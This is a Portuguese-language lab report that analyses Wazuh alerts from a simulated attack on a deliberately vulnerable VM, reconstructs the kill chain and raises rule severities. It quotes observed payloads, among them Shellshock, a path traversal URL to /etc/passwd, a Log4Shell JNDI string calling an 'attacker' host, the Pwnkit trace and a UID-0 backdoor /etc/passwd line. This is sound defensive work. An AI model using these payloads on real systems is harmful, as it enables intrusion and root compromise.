# Lab 3 — Descobertas

---

## Ruído Benigno Identificado

### rule 19007, 19008, 19009 — CIS Ubuntu Linux 22.04 LTS Benchmark
- Dispara automaticamente no arranque do sistema
- Contém checks de configuração de partições, permissões, serviços, firewall, SSH, auditoria, etc.
- É benigno — faz parte do scan automático de compliance CIS
- Não indica ataque
- **Acção:** suprimir com regras level 0 (rules 100300, 100302, 100303)

### rule 19004 — SCA summary: CIS Ubuntu Linux 22.04 LTS Benchmark
- Sumário automático do scan CIS (Center for Internet Security) que corre no arranque do sistema
- O scan verificou **207 checks** de boas práticas de segurança e o sistema passou apenas **71** — score de **43%**
- Este score baixo é esperado e intencional: a máquina `victim` está propositadamente mal configurada para simular um servidor de produção vulnerável
- É a má configuração base da máquina que permite ao atacante explorar as vulnerabilidades — não é o atacante a causar este score
- Dispara uma vez por scan no arranque, não tem relação com actividade maliciosa
- **Acção:** suprimir com regra level 0 (rule 100301)

---

## Narrativa de Investigação

Ao ordenar os eventos por timestamp ascendente no Wazuh **Threat Hunting → Events** com o filtro `agent.name: victim AND rule.level >= 5`, os primeiros alertas que chamaram a atenção foram os de `rule 550` — "Integrity checksum changed" — às 19:46:59. Ao investigar a partir daí, surgiram imediatamente a seguir os alertas de Shellshock (`rule 31168`, level 15) às 19:48:01, confirmando que o sistema estava a ser atacado activamente. O evento expandido mostrava no `full_log` o payload `() { :; }; echo; echo VULN` enviado via User-Agent para `/cgi-bin/test`, explorando a vulnerabilidade CVE-2014-6271. O Wazuh classificou este ataque com MITRE T1068 (Exploitation for Privilege Escalation) e T1190 (Exploit Public-Facing Application). A rule 31168 é built-in do Wazuh, já com level 15 (máximo possível) e tags MITRE correctas — não foi necessário fazer alterações.

Entre os eventos de Shellshock e o Path Traversal, o atacante gerou noise — logins legítimos simulados (`rule 100164/100166`) e requests com padrões XSS (`rule 100175`) — para dificultar a análise e misturar o tráfego malicioso com actividade aparentemente normal.

Seguiu-se o **Path Traversal** (`rule 100120`, level 6) às 19:48:41. O evento expandido mostrava no `data.url` o payload `/cgi-bin/traverse?orig=/icons/.%2e/.%2e/.%2e/.%2e/etc/passwd` — o atacante usou segmentos `%2e` (codificação URL de `.`) para escapar do webroot e aceder ao `/etc/passwd`, explorando a vulnerabilidade CVE-2021-41773 do Apache. Esta rule tinha level 6, o que é demasiado baixo para um ataque desta gravidade — um analista poderia não actuar imediatamente. Adicionalmente, não tinha tags MITRE nem grupo `attack`. Foi necessário melhorar a rule:

- Level **6 → 12** — path traversal a tentar aceder a ficheiros sensíveis do sistema é um ataque de alta severidade. Level 12 é apropriado porque está na faixa alta (12–14) que envia email em produção e garante que um analista actua rapidamente, mas é reservado para tentativas de acesso — ao contrário do level 15 que é para RCE confirmado ou malware activo como o Shellshock
- Adicionado MITRE **T1190** (Exploit Public-Facing Application)
- Adicionado grupo **attack**

Entre o Path Traversal e o Log4Shell, o atacante continuou a gerar noise — logins simulados de utilizadores `alice` e `bob` (`rule 100164/100166`) e requests com padrões XSS (`rule 100175`) — antes de passar à fase seguinte.

Seguiu-se o **Log4Shell** (`rule 100130`, level 6) às 19:50:02. O evento expandido mostrava no `full_log` o payload `${jndi:ldap://attacker:1389/Exploit}` registado em `/var/log/vuln-app/app.log` — o atacante explorou a vulnerabilidade CVE-2021-44228 do Log4j para tentar executar código remotamente via JNDI lookup. A rule tinha level 6, completamente inadequado para RCE, sem tags MITRE nem grupo `attack`. Foi necessário melhorar a rule:

- Level **6 → 13** — é RCE confirmado via JNDI lookup, mais grave que o Path Traversal (level 12) que só tenta ler ficheiros; não chega a 15 porque o Wazuh detecta o padrão no log, não a execução confirmada
- Adicionado MITRE **T1190** (Exploit Public-Facing Application)
- Adicionado grupo **attack**

Seguiu-se o **Pwnkit** (`rule 100140`, level 5) às 19:51:52. O evento expandido mostrava no `full_log` a string `pkexec: pkexec: GCONV_PATH=. pwning` no `/var/log/syslog`, com `predecoder.program_name: pkexec` — assinatura clássica do CVE-2021-4034, exploração do pkexec para escalada de privilégios locais para root. Level 5 é completamente inadequado — privilege escalation confirmada é um dos eventos mais críticos numa investigação. Foi necessário melhorar a rule:

- Level **5 → 13** — escalada de privilégios confirmada via pkexec é tão grave quanto RCE; o atacante obtém acesso root ao sistema
- Adicionado MITRE **T1068** (Exploitation for Privilege Escalation)
- Adicionado grupo **attack**

---

## Sequência do Ataque (Kill Chain)

| Timestamp | Rule ID | Descrição | CVE | Step |
|---|---|---|---|---|
| 19:46:59 | 550 | Integrity checksum changed | — | Pré-ataque: ficheiros modificados |
| 19:48:01 | 31168 | Shellshock attack detected (level 15) — payload `() { :; }; echo; echo VULN` — MITRE T1068, T1190 | CVE-2014-6271 | 1. Shellshock |
| 19:48:41 | 100120 | URL contains encoded '..' segment | CVE-2021-41773 | 2. Path Traversal |
| 19:50:02 | 100130 | 'jndi:' substring detected | CVE-2021-44228 | 3. Log4Shell |
| 19:51:52 | 100140 | 'pkexec' substring observed | CVE-2021-4034 | 4. Pwnkit |
| 19:52:32 | 100150 | FIM: /etc/passwd file changed | CVE-2021-4034 | 5. Privilege escalation |
| 19:54:14 | 100170 | tar invoked | — | 6. Exfiltração |


---

## Detalhes dos Eventos de Ataque

### rule 100150 — FIM: /etc/passwd file changed
O evento mais revelador de todo o ataque surgiu às 19:52:32. O `syscheck.diff` mostrava a linha adicionada ao `/etc/passwd`:

```
> lab-backdoor:x:0:0::/root:/bin/sh
```

O atacante adicionou um utilizador `lab-backdoor` com UID 0 — ou seja, com privilégios de root. Isto é uma backdoor persistente que permite ao atacante reentrar no sistema com acesso total mesmo após o incidente ser detectado. A rule tinha level 8, completamente inadequado para este tipo de evento. Foi necessário melhorar a rule:

- Level **8 → 15** — criação de utilizador com UID 0 é o evento mais crítico possível: o atacante tem acesso root persistente ao sistema. Justifica o level máximo
- Adicionado MITRE **T1136.001** (Create Account: Local Account)
- Adicionado grupo **attack**

### rule 100162 — Apache: POST request to /reports/submit/
Às 19:53:04 surgiu um POST para `/reports/submit/` com User-Agent `lab-notes-client/1.0` — um cliente não standard que não corresponde a nenhum browser legítimo. O event tinha level 4, praticamente invisível para um analista. Isoladamente poderia parecer benigno — uma submissão de report normal — mas o contexto do ataque torna-o suspeito. Foi necessário melhorar a rule:

- Level **4 → 7** — POST de cliente não standard após sequência de ataques é suspeito e merece atenção
- Adicionado MITRE **T1071.001** (Application Layer Protocol: Web Protocols)
- Adicionado grupo **attack**

### rule 100170 — System log: tar invoked
Logo a seguir, às 19:54:14, surgiu o evento do tar com o `full_log`:

```
exfil: tar -cf /tmp/www.tar /var/www (exfil staging)
```

O atacante comprimiu todo o directório `/var/www` para `/tmp/www.tar` — preparação para exfiltração de dados. A rule tinha level 7 sem MITRE nem grupo `attack`. Foi necessário melhorar a rule:

- Level **7 → 13** — compressão de directórios web para staging de exfiltração é claramente malicioso no contexto do ataque; não chega a 15 porque o tar isoladamente é ambíguo, mas após Shellshock, Log4Shell, Pwnkit e backdoor root é inequivocamente parte da cadeia de exfiltração
- Adicionado MITRE **T1560.001** (Archive Collected Data: Archive via Utility)
- Adicionado grupo **attack**

**Correlação:** A sequência `rule 100162` (POST /reports/submit/) seguida de `rule 100170` (tar) dentro de um curto intervalo de tempo é muito mais suspeita do que cada evento isolado. Foi adicionada uma regra de correlação que dispara quando ambos ocorrem no mesmo agente dentro de 120 segundos.

**Nota sobre a rule 100170:** Para além do level e do grupo attack, foi também adicionado o MITRE **T1560.001** (Archive Collected Data: Archive via Utility) — esta tag permite que o evento apareça na vista MITRE ATT&CK do Wazuh e seja pesquisável por técnica, facilitando a correlação com outros eventos de exfiltração em investigações futuras.